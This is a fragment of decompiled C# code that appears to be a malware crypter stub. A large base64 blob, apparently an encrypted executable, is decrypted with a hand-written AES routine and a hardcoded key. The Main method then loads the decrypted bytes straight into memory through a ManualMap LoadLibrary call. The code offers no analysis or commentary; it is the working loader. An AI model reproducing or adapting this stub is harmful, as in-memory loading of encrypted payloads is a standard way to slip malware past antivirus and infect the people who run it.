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wv5eBWK9KTWRlK6GRfMCDrrjUaf6tlRAUwVzhBEhOCT+S+Z3zwRu++8X97KL5Ak3bBIi0CDMl+YqVAi7/L5Vc0d3+lJ76C/H9smM0fEfys/VN9eLnLIrX4VzxT6akobROhGtl/hVn8IMtEy93frOUFuOBoVXlDhFv9uaz19OF5igtVBh7jyvEHRAFfavIGcsHhNlr4oa/JwGdq4UcCAZ/0TSPnW1iQ5Vk9yTVwRmKDs68O5DYjjqlQU7IHzS7tK1JaYzPGXv1JshAaN8A6jiQHa0jg1vv3XW4ihOLxML8wF//IpjguXpyB0AR3dJ5aSruSfLRlOdr1ST6VKC8khnaLXEroXUiccG9I9N3JxAfvJnhsrR4qWSod9mbgKfrGCjGlW4PdwZqdThA53cnZu6v7JtssB1M5ZWypfJ+EAfG+GrDjJ4NQs82O11BWDF+OOPVjQDD6CK0AFnpaRTXIScuJ1aVaKpcNqZaclKvmnQOwYH4EHwgeGW/N9IcI41eAaslCm+JtArClND9SoZEp084olpbjW5tGrsQm2O5V6h/W9zCaaM6tPPlZbeUlKAydooizXJZuARqfFRj37jAe1uKgp7WJnrWl+mYXPVtZA1TcJ7kJT0eNPOB64eFwpwjAP/m+LP4o5njudjAuifc1dBrPLXK6aH5AUs3acl/Qs3w1NiV2hpPvDc4RUdU+TPsgJ+cyqLKAPlh+7FE7kmad5gk3xqOrq5MW9l9VBTuMzKJ7UZ3Z5c+eF+H99CltApSUUiIfpj5GtoWieeqs89DvWemkQpFUvEbUZTn/mW+V8wUC/iFkC/4T95FShoavA7PNSX4alLwaexSEs3bEyGg7ieoh/lwxB5Ol6aCeSsj2XHGG6+dcXNz7EX+kpAjKOJvs7t0rD2/1oK334TsHydT3k9SOcD1bzpOjGYbfvKww0pmf0doKmHJRoSxjAnH2HUFSsBlTOUp/yVsG6PYqkhFKsG211b/K27xuz8TMzRRTmLaORNiW5DjpuZyl+BXj6xoYMWp/OK0MTh875BNrV7Zexh4cgt6d0DCplH3N2PGX0yqbWj8JkEMdxXdIeRrGDIRsDMr1O1ZnOav1goQj9wX4gN3Vo1NqE5DdhmD60vj2U0RniIfl3o2KbOH8eHlJYGkeSMQ88WfX0II71iVNSeFn3kjEPPFn19CCO9YlTUnhZ95IxDzxZ9fQgjvWJU1J4WfeSMQ88WfX0II71iVNSeFn3kjEPPFn19CCO9YlTUnhZ95IxDzxZ9fQgjvWJU1J4WfeSMQ88WfX0II71iVNSeFn3kjEPPFn19CCO9YlTUnhZ95IxDzxZ9fQgjvWJU1J4WfeSMQ88WfX0II71iVNSeFn3kjEPPFn19CCO9YlTUnhZ95IxDzxZ9fQgjvWJU1J4WfeSMQ88WfX0II71iVNSeFn3kjEPPFn19CCO9YlTUnhZ95IxDzxZ9fQgjvWJU1J4WfeSMQ88WfX0II71iVNSeFn3kjEPPFn19CCO9YlTUnhZ95IxDzxZ9fQgjvWJU1J4WfeSMQ88WfX0II71iVNSeFn3kjEPPFn19CCO9YlTUnhZ95IxDzxZ9fQgjvWJU1J4WfeSMQ88WfX0II71iVNSeFn3kjEPPFn19CCO9YlTUnhZ8cOhs3Zw0Ix883XC7BmJko");

	public static void Main()
	{
		byte[] rawAssembly = decrypt(pe, decode("RQghwImF6LEpPprIxjVxqpvv9tBEob4f0xfG6yZH3i4fp/H72gTqF2Irq5+nXGmrkgOrnFMZUqNIAexyvvuL4A=="));
		run_pe(rawAssembly);
	}

	private static void run_pe(byte[] rawAssembly)
	{
		new ManualMap().LoadLibrary(rawAssembly);
	}

	private static byte[] decode(string s)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
		int[] array = new int[128];
		for (int i = 0; i < text.Length; i++)
		{
			array[(uint)text[i]] = i;
		}
		int num = (s.EndsWith("==") ? 2 : (s.EndsWith("=") ? 1 : 0));
		byte[] array2 = new byte[s.Length * 3 / 4 - num];
		int num2 = 255;
		int num3 = 0;
		int num4 = 0;
		while (true)
		{
			if (num4 < s.Length)
			{
				int num5 = array[(uint)s[num4]];
				int num6 = array[(uint)s[num4 + 1]];
				array2[num3++] = (byte)(((num5 << 2) | (num6 >> 4)) & num2);
				if (num3 < array2.Length)
				{
					int num7 = array[(uint)s[num4 + 2]];
					array2[num3++] = (byte)(((num6 << 4) | (num7 >> 2)) & num2);
					if (num3 >= array2.Length)
					{
						break;
					}
					int num8 = array[(uint)s[num4 + 3]];
					array2[num3++] = (byte)(((num7 << 6) | num8) & num2);
					num4 += 4;
					continue;
				}
				return array2;
			}
			return array2;
		}
		return array2;
	}

	private static byte[] xor_func(byte[] a, byte[] b)
	{
		byte[] array = new byte[a.Length];
		for (int i = 0; i < a.Length; i++)
		{
			array[i] = (byte)(a[i] ^ b[i]);
		}
		return array;
	}

	private static byte[][] generateSubkeys(byte[] key)
	{
		byte[][] array = new byte[Nb * (Nr + 1)][];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = new byte[4];
		}
		for (int j = 0; j < Nk; j++)
		{
			array[j][0] = key[j * 4];
			array[j][1] = key[j * 4 + 1];
			array[j][2] = key[j * 4 + 2];
			array[j][3] = key[j * 4 + 3];
		}
		for (int j = Nk; j < Nb * (Nr + 1); j++)
		{
			byte[] array2 = new byte[4];
			for (int k = 0; k < 4; k++)
			{
				array2[k] = array[j - 1][k];
			}
			if (j % Nk == 0)
			{
				array2 = SubWord(rotateWord(array2));
				array2[0] = (byte)(array2[0] ^ (Rcon[j / Nk] & 0xFFu));
			}
			else if (Nk > 6 && j % Nk == 4)
			{
				array2 = SubWord(array2);
			}
			array[j] = xor_func(array[j - Nk], array2);
		}
		return array;
	}

	private static byte[] SubWord(byte[] input)
	{
		byte[] array = new byte[input.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(sbox[input[i] & 0xFF] & 0xFFu);
		}
		return array;
	}

	private static byte[] rotateWord(byte[] input)
	{
		byte[] array = new byte[input.Length];
		array[0] = input[1];
		array[1] = input[2];
		array[2] = input[3];
		array[3] = input[0];
		return array;
	}

	private static byte[][] AddRoundKey(byte[][] state, byte[][] w, int round)
	{
		byte[][] array = new byte[state.Length][];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = new byte[state[0].Length];
		}
		for (int j = 0; j < Nb; j++)
		{
			for (int k = 0; k < 4; k++)
			{
				array[k][j] = (byte)(state[k][j] ^ w[round * Nb + j][k]);
			}
		}
		return array;
	}

	private static byte[][] SubBytes(byte[][] state)
	{
		byte[][] array = new byte[state.Length][];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = new byte[state[0].Length];
		}
		for (int j = 0; j < 4; j++)
		{
			for (int k = 0; k < Nb; k++)
			{
				array[j][k] = (byte)(sbox[state[j][k] & 0xFF] & 0xFFu);
			}
		}
		return array;
	}

	private static byte[][] InvSubBytes(byte[][] state)
	{
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < Nb; j++)
			{
				state[i][j] = (byte)(inv_sbox[state[i][j] & 0xFF] & 0xFFu);
			}
		}
		return state;
	}

	private static byte[][] ShiftRows(byte[][] state)
	{
		byte[] array = new byte[4];
		for (int i = 1; i < 4; i++)
		{
			for (int j = 0; j < Nb; j++)
			{
				array[j] = state[i][(j + i) % Nb];
			}
			for (int k = 0; k < Nb; k++)
			{
				state[i][k] = array[k];
			}
		}
		return state;
	}

	private static byte[][] InvShiftRows(byte[][] state)
	{
		byte[] array = new byte[4];
		for (int i = 1; i < 4; i++)
		{
			for (int j = 0; j < Nb; j++)
			{
				array[(j + i) % Nb] = state[i][j];
			}
			for (int k = 0; k < Nb; k++)
			{
				state[i][k] = array[k];
			}
		}
		return state;
	}

	private static byte[][] InvMixColumns(byte[][] s)
	{
		int[] array = new int[4];
		byte a = 14;
		byte a2 = 11;
		byte a3 = 13;
		byte a4 = 9;
		for (int i = 0; i < 4; i++)
		{
			array[0] = FFMul(a, s[0][i]) ^ FFMul(a2, s[1][i]) ^ FFMul(a3, s[2][i]) ^ FFMul(a4, s[3][i]);
			array[1] = FFMul(a4, s[0][i]) ^ FFMul(a, s[1][i]) ^ FFMul(a2, s[2][i]) ^ FFMul(a3, s[3][i]);
			array[2] = FFMul(a3, s[0][i]) ^ FFMul(a4, s[1][i]) ^ FFMul(a, s[2][i]) ^ FFMul(a2, s[3][i]);
			array[3] = FFMul(a2, s[0][i]) ^ FFMul(a3, s[1][i]) ^ FFMul(a4, s[2][i]) ^ FFMul(a, s[3][i]);
			for (int j = 0; j < 4; j++)
			{
				s[j][i] = (byte)array[j];
			}
		}
		return s;
	}

	private static byte[][] MixColumns(byte[][] s)
	{
		int[] array = new int[4];
		byte a = 2;
		byte a2 = 3;
		for (int i = 0; i < 4; i++)
		{
			array[0] = FFMul(a, s[0][i]) ^ FFMul(a2, s[1][i]) ^ s[2][i] ^ s[3][i];
			array[1] = s[0][i] ^ FFMul(a, s[1][i]) ^ FFMul(a2, s[2][i]) ^ s[3][i];
			array[2] = s[0][i] ^ s[1][i] ^ FFMul(a, s[2][i]) ^ FFMul(a2, s[3][i]);
			array[3] = FFMul(a2, s[0][i]) ^ s[1][i] ^ s[2][i] ^ FFMul(a, s[3][i]);
			for (int j = 0; j < 4; j++)
			{
				s[j][i] = (byte)array[j];
			}
		}
		return s;
	}

	private static byte FFMul(byte a, byte b)
	{
		byte b2 = a;
		byte b3 = b;
		byte b4 = 0;
		while (b2 != 0)
		{
			if (((uint)b2 & (true ? 1u : 0u)) != 0)
			{
				b4 = (byte)(b4 ^ b3);
			}
			byte b5 = (byte)(b3 & 0x80u);
			b3 = (byte)(b3 << 1);
			if (b5 != 0)
			{
				b3 = (byte)(b3 ^ 0x1Bu);
			}
			b2 = (byte)((b2 & 0xFF) >> 1);
		}
		return b4;
	}

	private static byte[] decryptBloc(byte[] input)
	{
		byte[] array = new byte[input.Length];
		byte[][] array2 = new byte[4][];
		for (int i = 0; i < array2.Length; i++)
		{
			array2[i] = new byte[Nb];
		}
		for (int j = 0; j < input.Length; j++)
		{
			array2[j / 4][j % 4] = input[j % 4 * 4 + j / 4];
		}
		array2 = AddRoundKey(array2, w, Nr);
		for (int num = Nr - 1; num >= 1; num--)
		{
			array2 = InvSubBytes(array2);
			array2 = InvShiftRows(array2);
			array2 = AddRoundKey(array2, w, num);
			array2 = InvMixColumns(array2);
		}
		array2 = InvSubBytes(array2);
		array2 = InvShiftRows(array2);
		array2 = AddRoundKey(array2, w, 0);
		for (int k = 0; k < array.Length; k++)
		{
			array[k % 4 * 4 + k / 4] = array2[k / 4][k % 4];
		}
		return array;
	}

	private static byte[] decrypt(byte[] input, byte[] key)
	{
		byte[] array = new byte[input.Length];
		byte[] array2 = new byte[16];
		Nb = 4;
		Nk = key.Length / 4;
		Nr = Nk + 6;
		w = generateSubkeys(key);
		int i;
		for (i = 0; i < input.Length; i++)
		{
			if (i > 0 && i % 16 == 0)
			{
				array2 = decryptBloc(array2);
				Array.Copy(array2, 0, array, i - 16, array2.Length);
			}
			if (i < input.Length)
			{
				array2[i % 16] = input[i];
			}
		}
		array2 = decryptBloc(array2);
		Array.Copy(array2, 0, array, i - 16, array2.Length);
		return deletePadding(array);
	}

	private static byte[] deletePadding(byte[] input)
	{
		int num = 0;
		int num2 = input.Length - 1;
		while (input[num2] == 0)
		{
			num++;
			num2--;
		}
		byte[] array = new byte[input.Length - num - 1];
		Array.Copy(input, 0, array, 0, array.Length);
		return array;
	}
}
